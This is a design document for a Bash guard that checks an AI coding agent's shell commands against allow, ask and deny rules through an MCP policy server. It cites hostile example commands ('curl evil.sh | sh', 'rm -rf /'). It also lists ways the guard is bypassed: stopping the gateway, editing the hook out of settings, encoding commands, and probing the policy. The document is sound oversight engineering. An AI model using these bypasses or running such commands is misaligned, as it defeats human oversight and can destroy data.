# The Bash guard

This document explains the design of the PreToolUse Bash guard — the box-side hook, the
`bash-guard-mcp` service, and the policy they share — and the reasoning behind its non-obvious
choices, for whoever next needs to change it. For day-to-day usage (turning it on, editing
policy, checking a command) see `README.md`. This is not a change log — it doesn't track who
did what or when, only what the design is and why it has to be that way.

## Shape

Every Bash command the box's Claude Code is about to run takes this path before it executes:

1. Claude Code fires a `PreToolUse` hook matching the `Bash` tool. The hook is of type
   `mcp_tool` — a built-in Claude Code hook handler that calls an MCP tool and reads the
   tool's text reply as the hook's output. There is no script, no shim binary, and no MCP
   client of ours in the box.
2. The tool call goes to the MCP server the box already has configured — `agentgateway` at
   `http://host.boxlite.internal:15003/mcp`, baked into `/root/.claude.json`.
3. agentgateway routes it to the `bash-guard` target: the `bash-guard-mcp` sibling compose
   service, which publishes no host port and is reachable only across the compose network.
4. That server matches the command against `agentgateway/bash-guard/rules.json` and returns
   either Claude Code's hook-output JSON (carrying `allow`, `ask`, or `deny`) or plain text
   meaning "no opinion".
5. Claude Code acts on the reply: `deny` blocks the command and tells Claude why, `ask`
   prompts the user, `allow` skips the prompt, no opinion leaves the normal permission flow
   untouched.

The policy lives on the host, in git, and is edited without rebuilding the image or restarting
a container. The box holds only the wiring.

## The return contract, and why "no opinion" is the default

Claude Code decides how to read a hook's output by its first non-whitespace character: output
starting with `{` is parsed as JSON decision output, and anything else is treated as plain
text. `mcp_tool` hooks are read by the same rule, applied to the tool's text content.

That single rule is what makes a four-state verdict possible over a channel that only carries
text:

| Verdict     | What the server returns             | What Claude Code does                          |
| ----------- | ----------------------------------- | ---------------------------------------------- |
| `deny`      | JSON, `permissionDecision: deny`    | Blocks the command; Claude sees the reason      |
| `ask`       | JSON, `permissionDecision: ask`     | Prompts the user                                |
| `allow`     | JSON, `permissionDecision: allow`   | Runs it without a prompt                        |
| `undecided` | plain text, deliberately not `{`    | Nothing — the normal permission flow decides    |

`undecided` is the default for a command no rule matches, and that choice is load-bearing.
The tempting default is `allow`, since the guard "didn't object" — but a hook returning
`allow` *suppresses* the permission prompt, so defaulting to it would auto-approve every
command not named in `rules.json`. That is strictly weaker than a box with no guard at all.
Staying silent means the guard can only ever add friction (`ask`) or refusal (`deny`) on top
of Claude Code's own permission model, never subtract it.

This is also why `allow` rules deserve suspicion. The one shipped (`read-only-basics`) is
anchored with `^...$` so it matches a whole command and nothing chained onto it: `git status`
matches, `git status && curl evil.sh | sh` does not.

## What this is not

**It is not a containment boundary, and it fails open.** Claude Code treats an `mcp_tool` hook
whose server is unreachable — or whose tool returns `isError` — as a *non-blocking* error: it
logs the failure and runs the command. So a stopped gateway, a crashed `bash-guard-mcp`, a
network blip, or a bug in the policy server all mean commands run unguarded. That behaviour is
not configurable from the hook side.

Three consequences worth being plain about:

- A box that can stop the gateway can disable its own guard. Boxes reach every published host
  port through `host.boxlite.internal`, and nothing here changes that.
- The box's Claude Code can edit `/root/.claude/settings.json` and remove the hook. The hook
  is a guardrail against mistakes, not an adversary.
- Patterns match the raw command string. Base64, a variable, or a here-doc gets a command past
  any regex here without effort.

Design accordingly: put things in `deny` that you never want to happen by accident, not things
you are defending against an adversary who wants them to happen. The real boundaries in this
setup are the microVM and the credential model in `docs/design/agentgateway.md` — not this.

## Why the policy engine is its own MCP server

The obvious-looking alternative is to skip the extra service and express policy in
agentgateway's own `mcpAuthorization` CEL rules, which exist precisely to allow and deny MCP
tool calls. It cannot work for this, and the reason is worth recording because the config
schema gives no hint of it.

**The CEL context for MCP authorization has no access to tool call arguments.** Checked against
the `v1.4.1` tag's source, not HEAD (`crates/agentgateway/src/mcp/rbac.rs`): the rule set is
evaluated against a `ResourceType` — `Tool`, `Prompt`, `Resource`, or `Task` — carrying only a
`target` and a `name`. So `mcp.tool.name` and `jwt.*` are available to a rule, and the
`command` argument simply is not. A CEL rule can decide *whether the box may call the guard
tool at all*; it cannot look at the command being guarded, which is the entire question here.

Two further traps in that direction, both from the same source:

- `mcpAuthorization` rule sets are merged across levels and an `allow` anywhere does not
  override a `deny` elsewhere. More important for this repo: rules attach to the whole target
  set (`mcp.policies` or the route), not per target — the schema says so explicitly on
  `LocalMcpTarget.policies`. A single `allow` rule written for the guard tool therefore denies
  every GitHub tool at the same time, since a request that matches no `allow` is denied. Any
  future rule here must enumerate what stays allowed.
- `mcpGuardrails` processors (`mcp.policies.mcpGuardrails`) *do* see the full request and could
  in principle judge arguments, but a processor is itself a remote service implementing
  agentgateway's processor protocol. That is strictly more machinery than one MCP server, for
  the same result.

So the gateway is not the decision engine here — it is the path. What it still contributes is
real: the box needs no new endpoint, credential, or trust decision (it already talks to this
MCP server); every decision lands in the gateway's request log and traces alongside everything
else; and the guard is reachable only through a proxy the box cannot bypass to edit policy,
because `bash-guard-mcp` publishes no port.

## Constraints the wiring must obey

| Constraint | Consequence if violated |
|---|---|
| `mcp.prefixMode` must stay `never` in `config.yaml`. | The schema default (`conditional`) prefixes tool names with their target name as soon as a second target exists. Adding `bash-guard` would then rename every GitHub tool the box sees (`get_me` → `github_get_me`), breaking the hook's `tool:` binding and any permission rule naming a tool. The cost of `never` is that names must be unique across targets — check before adding a third. |
| `bash-guard-mcp` must not publish a host port. | Every running box reaches published host ports via `host.boxlite.internal` (see `docs/design/agentgateway.md`). A published port lets a box query its own guardrail directly, bypassing the gateway's log — and with a writable mount, rewrite the policy it is judged by. |
| The compose service mounts the whole `bash-guard/` directory, not the two files. | Editors that save by atomic rename replace a file's inode; a single-file bind mount keeps showing the old one, so edits to `rules.json` would silently never take effect. |
| A rule's `pattern` uses `[^;&\|]*` where it needs "anything", not `.*`. | `.*` spans shell separators, so a pattern can match the head of one command and the tail of an unrelated one in the same chain — `cd /tmp && rm -rf build` reading as a delete of `/`. |
| Denies come before the broader asks that also match. | First match wins. `rm-recursive` (ask) placed above `rm-root-target` (deny) would downgrade `rm -rf /` to a prompt. |

## Decisions worth recording

**Why an `mcp_tool` hook rather than a `command` hook running a script.** A command hook would
mean shipping an MCP client into the image: the streamable-HTTP handshake, session header,
SSE-or-JSON response handling, and a failure policy of its own — perhaps 150 lines to maintain
in the box, versus a config block. It would buy exactly one thing the `mcp_tool` hook cannot
do: choosing to fail *closed* when the gateway is unreachable. That is a real difference (see
"What this is not"), and it is the one reason to revisit this — but a fail-closed guard in this
repo means every Bash command in every box breaks whenever the optional gateway is down, which
is a worse default than the honest one.

**Why the hook is off unless built with `--build-arg BASH_GUARD_HOOK=on`.** `just up` does not
start the gateway; the gateway is opt-in, and a box booted without it must behave as it did
before this existed. With the hook baked in unconditionally and no gateway running, Claude Code
reports a non-blocking hook error on *every* Bash call. The build arg keeps the default box
unchanged and makes enabling the guard a deliberate act, paired with `just gateway-up`.

**Why the server is stdlib-only Python bind-mounted into a stock image.** Same shape as
`github-mcp`: an official image plus mounted config, no image to build, nothing to push to the
registry, and no dependency to keep patched. It is also why the policy file is JSON rather than
YAML — no parser to install. The cost is writing the MCP transport by hand, which stays small
because only one tool and no server-initiated streaming are needed.

**Why rules reload on mtime instead of on restart.** Policy is the part that gets edited, often
while watching what a box does. Reloading on the next tool call means an edit takes effect
immediately with no dropped MCP session. A rules file that fails to parse keeps the last good
policy in memory and logs loudly, rather than silently dropping to "no opinion" the moment
someone saves a typo — the failure mode of a policy engine should never be "quietly stops
having a policy".

**Why a missing rules file does not stop the server.** Crash-looping the container would make
the hook fail open on every command, which is the opposite of what a broken policy file should
do. Instead the server starts on a built-in minimal deny list and says so in its logs.

## Verifying a change hasn't broken it

`just guard-test` runs the policy and protocol checks with no gateway, no box, and no docker:
the MCP handshake, every shipped rule, the commands that must stay undecided, the reload path,
and the missing-file fallback. It is the fast check after editing `rules.json`, and the only
test in this repo that needs nothing running.

`just guard-check` (reading a command from stdin) is the end-to-end one: it walks the real path
through the running gateway and prints the decision Claude Code would act on. Use it to prove
the wiring — the target, the compose network, the tool name — not the policy.

The one property worth re-deriving after any change to the hook or the return contract is that
an unmatched command still produces **no** decision. Pipe an ordinary command through
`just guard-check` and confirm it reports `undecided`; if it ever reports `allow`, the guard has
started auto-approving everything it doesn't recognise, which is the failure this design exists
to avoid.

Neither check covers the box side. That needs a box: build with
`just build --build-arg BASH_GUARD_HOOK=on`, `just gateway-up`, `just up`, then ask the box's
Claude to run something on the deny list and watch `just gateway-logs` for the matching
`[bash-guard] deny` line.

## Open and deferred items

State these as risks to revisit, not TODOs to feel bad about:

- **The guard tool is visible to the box's Claude like any other MCP tool.** It can call
  `check_bash_command` directly, which is harmless (it returns a verdict and changes nothing),
  but it also means the model can read the policy's shape by probing it. Hiding it would take
  `mcpAuthorization` rules, which carry the deny-everything-else trap above.
- **Every Bash command now costs a round trip** to the host and back. Unmeasured, and probably
  irrelevant next to model latency, but it is on the critical path of the box's most frequently
  used tool.
- **Decisions are logged with the full command text** (truncated to 200 characters) to the
  container's stderr, readable via `just gateway-logs`. That is the audit trail working as
  intended, but it is a second place where command text lands, alongside the gateway's own
  request log.
- **`mcpGuardrails` processors are unexplored.** They are the agentgateway-native way to judge
  a tool call's arguments in the gateway itself, and would move the deny decision in front of
  the policy server. Worth a look if this ever needs to guard more than one tool — but note it
  cannot fix the fail-open property, which lives in Claude Code's hook handling, not here.
- **Rules are matched against the whole command, quoted text included.** `echo 'git push'`
  triggers the `git-push` ask. Stripping quotes first would fix that and simultaneously stop
  matching `bash -c 'rm -rf /'`, where the quoted text is the command — the current behaviour
  is the deliberate trade, and `test_server.py` pins both halves of it so a future change has to
  face the choice.
